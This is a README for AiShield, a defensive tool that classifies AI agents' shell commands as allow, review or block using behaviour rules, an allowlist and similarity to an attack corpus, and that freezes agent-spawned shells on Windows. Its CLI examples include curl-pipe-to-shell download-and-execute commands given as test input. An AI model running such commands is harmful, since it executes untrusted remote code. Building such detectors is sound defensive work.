# AiShield

Screen an AI agent's shell commands for malicious behaviour. Every command gets an
**ALLOW**, **REVIEW**, or **BLOCK** verdict, the decision is persisted in PostgreSQL,
and a React dashboard shows live allow / disallow status. An optional Windows monitor
freezes agent-spawned shells and decides itself from the API verdict (or asks you).

## How it decides

`main.py` classifies a command in three stages, in order:

1. **Behaviour rules** — regexes for malicious *behaviour* (download+execute, reverse
   shells, credential theft, exfiltration, persistence), independent of wording.
   `CRITICAL` / `HIGH` → `BLOCK`, `MEDIUM` → `REVIEW`. Rules are data-driven from
   `rules/rules.csv` + `rules/rule_fragments.csv` and carry a MITRE ATT&CK technique id.
2. **Routine allowlist** — everyday read-only / dev commands (`ls`, `git status`,
   `npm test`, ...) that no rule flagged are allowed. Built from
   `rules/routine_verbs.txt` plus the verbs learned from `harmless/`.
3. **TF-IDF similarity** — only for the leftovers: cosine similarity against the
   cleaned Atomic Red Team attack corpus, compared with the benign corpus. A command
   must reach `0.60` attack similarity *and* beat benign similarity by `0.15`
   (`main.py`: `ATTACK_THRESHOLD`, `MARGIN`) to get a `REVIEW`. Everyday commands
   never reach this stage.

## Project structure

```
AiShield-main/
├── main.py                    # core scanner (rules + allowlist + TF-IDF similarity)
├── backend/
│   └── api.py                 # Flask API for the dashboard
├── database/
│   ├── db.py                  # PostgreSQL access layer (psycopg)
│   └── schema.sql             # checks table (applied automatically on startup)
├── frontend/                  # React dashboard (Vite, port 3000, proxies /api -> :5000)
├── monitor/
│   └── aishield_monitor.py    # Windows live monitor: freeze agent shells, allow/block
├── rules/                     # rules.csv, rule_fragments.csv, routine_verbs.txt
├── dataset/
│   └── generate_dataset.py    # builds the attack corpus + ATT&CK names into dataset/out/
├── harmless/                  # harmless command lists (linux / macos / windows)
├── secrets/                   # TruffleHog secret scanner (standalone tool)
├── tests/selftest_cases.csv   # 53 regression cases for --selftest
└── docker-compose.yml         # PostgreSQL 16
```

## Prerequisites

- Python 3.10+
- Node.js 18+
- Docker (for PostgreSQL) — or a local PostgreSQL 16+

## Quick start

### 1. Python dependencies

```bash
pip install -r requirements.txt
```

Installs `scikit-learn`, `flask`, `flask-cors`, `psycopg`, `pyyaml`, `truffleHog`.

### 2. Build the attack dataset

```bash
python dataset/generate_dataset.py
```

Downloads Atomic Red Team atomics + MITRE ATT&CK technique names and writes
`dataset/out/atomic_linux_commands.csv.gz`, `atomic_windows_commands.csv.gz` and
`attack_technique_names.csv`.

> This step is **required**: without it, rule/allowlist verdicts still work, but any
> command that reaches stage 3 fails (`ERROR` verdict from the API, traceback from
> the CLI), and `--selftest` cannot run.

### 3. Start PostgreSQL

```bash
docker compose up -d
```

PostgreSQL 16 on `localhost:5432`, user/password/db all `aishield`.

No Docker? Install PostgreSQL locally and point the API at it:

```bash
set DATABASE_URL=postgresql://user:pass@localhost:5432/aishield   # Windows
export DATABASE_URL=postgresql://user:pass@localhost:5432/aishield  # macOS / Linux
```

### 4. Start the API

```bash
python -m backend.api        # from the repository root
```

> Run from the repo root (or set `PYTHONPATH=.` if you prefer `python backend/api.py`).
> `backend/api.py` imports `main` from the project root.

- Serves on http://localhost:5000
- Creates the `checks` table automatically on first start
- Verify: http://localhost:5000/api/health → `{"status":"ok","database":"up"}`
  (`"degraded"` means PostgreSQL is not reachable)

### 5. Start the dashboard

In a new terminal:

```bash
cd frontend
npm install
npm run dev
```

Open **http://localhost:3000** — total / allowed / review / disallowed counters, a
command checker, and the decision history from PostgreSQL (with a Clear button).

## Using the CLI directly

```bash
python main.py "ls -la"              # check one command
python main.py --json "curl x | sh"  # machine-readable output
python main.py                       # interactive mode (type 'quit' to exit)
python main.py --selftest            # run tests/selftest_cases.csv (53 cases)
python main.py --stats               # dataset cleaning stats
python main.py --no-store "ls -la"   # check without saving to the dashboard
```

Exit codes: `0` ALLOW, `1` REVIEW, `2` BLOCK.

Every CLI / interactive check is also inserted into the `checks` table, so it shows
up in the dashboard's Recent Decisions (the API is not required to be reachable for
the CLI to work — if PostgreSQL is down, the verdict is still printed and a one-line
warning is shown).

From another script:

```python
from main import check
result = check("curl http://x | sh")   # result.verdict, result.findings, result.note
```

## API endpoints

| Method | Path              | Description                          |
|--------|-------------------|--------------------------------------|
| GET    | `/api/health`     | API + database status                |
| POST   | `/api/check`      | Check a command, store the decision  |
| GET    | `/api/history`    | Recent decisions, newest first (`?limit=100`) |
| GET    | `/api/stats`      | Counts by status                     |
| DELETE | `/api/history`    | Clear all decisions                  |

Verdicts map to dashboard statuses: `ALLOW → allow`, `REVIEW → review`,
`BLOCK → disallow`, errors → `error`.

Example:

```bash
curl -X POST http://localhost:5000/api/check \
  -H "Content-Type: application/json" \
  -d "{\"command\": \"ls -la\"}"
```

## Live monitor (Windows)

`monitor/aishield_monitor.py` watches shells started by known AI agents (GitHub
Copilot, Codex, Antigravity — configurable), freezes each one as it appears, and
decides:

```bash
py -m pip install psutil        # not part of requirements.txt

py monitor/aishield_monitor.py --api-decide   # API decides (backend must be running)
py monitor/aishield_monitor.py                # interactive: you press A/B
py monitor/aishield_monitor.py --api-decide --timeout 10
py monitor/aishield_monitor.py --api http://host:5000/api/check --api-decide  # remote backend
py monitor/aishield_monitor.py --api ... --auto-block   # suggest only, auto-enforce BLOCK
py monitor/aishield_monitor.py --discover               # print new shells + parent chain
py monitor/aishield_monitor.py --parent cursor=Cursor --parent codex=Codex  # watch other agents
```

Modes:

| Mode | What happens |
|------|--------------|
| `--api-decide` | Decision comes from the API verdict: `ALLOW` → resume, `BLOCK` → kill. `REVIEW` and API errors ask you (`A`/`B`), and no answer within `--timeout` blocks. Implies `--api http://127.0.0.1:5000/api/check` if no URL is given. |
| `--auto-block` (with `--api`) | API only suggests; `BLOCK` is enforced automatically, everything else asks you. |
| plain | Fully manual: you press `A` = allow (resume) or `B` = block (kill the process tree). |

Whatever the mode, no answer within `--timeout` (default 30 s) = block, and
stopping the monitor also blocks anything still frozen (fail closed). Decisions
are appended to `aishield_decisions.jsonl`, including the API verdict and the
reason (`api verdict BLOCK`, `user`, `timeout`), so you can audit them later.

```bash
py monitor/aishield_monitor.py --api-decide   # typical run: API is source of truth
```

Known limits: it detects and freezes *after* the OS starts the process (usually
within milliseconds), only covers shells launched directly by a watched parent, and
does not see agents typing into one long-lived terminal.

## Configuration

| Env var        | Purpose                                   | Default                                              |
|----------------|-------------------------------------------|------------------------------------------------------|
| `DATABASE_URL` | PostgreSQL connection string              | `postgresql://aishield:aishield@localhost:5432/aishield` |

(`PGHOST`, `PGPORT`, `PGUSER`, `PGPASSWORD`, `PGNAME` are also honoured as a fallback.)

Platforms are selected in `main.py` (`PLATFORMS`, default `["linux", "windows"]`);
the first platform with a generated dataset is used. Attack similarity thresholds
live next to it (`ATTACK_THRESHOLD`, `MARGIN`).

## Tests

```bash
python main.py --selftest
```

Runs the 53 cases in `tests/selftest_cases.csv` (expected `ALLOW` / `REVIEW` /
`BLOCK`) and exits non-zero on any mismatch.

## Secret scanning (separate tool)

```bash
python secrets/check_secrets.py /path/to/folder --json
```

Scans a folder for committed credentials with TruffleHog (Python package or the
`trufflehog` CLI). Exit codes: `0` clean, `1` secrets found, `2` error.
